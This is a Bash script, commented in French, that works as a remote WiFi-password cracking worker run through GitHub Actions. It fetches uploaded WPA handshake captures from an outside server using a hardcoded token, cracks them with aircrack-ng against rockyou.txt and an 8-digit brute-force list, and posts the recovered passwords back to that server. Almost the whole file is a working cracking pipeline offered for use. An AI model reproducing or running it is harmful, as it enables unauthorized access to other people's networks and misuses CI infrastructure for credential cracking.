#!/bin/bash
# Script de cracking WiFi - exécuté par GitHub Actions

SITE_URL="https://wifi-wpa.byethost3.com"
TOKEN="MonTokenSecret123456"

# Récupérer une tâche en attente
echo "🔍 Vérification des tâches en attente..."
RESPONSE=$(curl -s "${SITE_URL}/api_status.php?token=${TOKEN}")
JOB_ID=$(echo "$RESPONSE" | jq -r '.job.id')

if [ "$JOB_ID" == "null" ] || [ -z "$JOB_ID" ]; then
    echo "✅ Aucune tâche en attente."
    exit 0
fi

echo "📥 Tâche #$JOB_ID trouvée, téléchargement du fichier..."

# Télécharger le .cap
curl -s -o "capture_${JOB_ID}.cap" "${SITE_URL}/api_download.php?token=${TOKEN}&id=${JOB_ID}"

if [ ! -f "capture_${JOB_ID}.cap" ] || [ ! -s "capture_${JOB_ID}.cap" ]; then
    echo "❌ Fichier non trouvé"
    curl -s -X POST -d "id=${JOB_ID}&status=failed&password=" "${SITE_URL}/api_update.php?token=${TOKEN}"
    exit 1
fi

echo "📊 Analyse du handshake..."

# Vérifier que le fichier contient un handshake
airodump-ng -r "capture_${JOB_ID}.cap" --write test_check > /dev/null 2>&1

# Essayer avec rockyou (wordlist classique)
echo "🔐 Test avec rockyou.txt..."
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b "$BSSID" "capture_${JOB_ID}.cap" > result.txt 2>&1

# Si pas trouvé, essayer en mode brute-force limité
if ! grep -q "KEY FOUND" result.txt; then
    echo "🔐 Pas trouvé dans rockyou, essai en force brute (8 chiffres)..."
    # Générer wordlist 8 chiffres et tester
    crunch 8 8 0123456789 -o wordlist_custom.txt 2>/dev/null
    aircrack-ng -w wordlist_custom.txt "capture_${JOB_ID}.cap" > result.txt 2>&1
fi

# Lire le résultat
if grep -q "KEY FOUND" result.txt; then
    PASSWORD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}')
    echo "✅ Mot de passe trouvé : $PASSWORD"
    curl -s -X POST -d "id=${JOB_ID}&status=cracked&password=${PASSWORD}" "${SITE_URL}/api_update.php?token=${TOKEN}"
else
    echo "❌ Mot de passe non trouvé"
    curl -s -X POST -d "id=${JOB_ID}&status=failed&password=" "${SITE_URL}/api_update.php?token=${TOKEN}"
fi

# Nettoyer
rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt test_check*
echo "✅ Terminé"
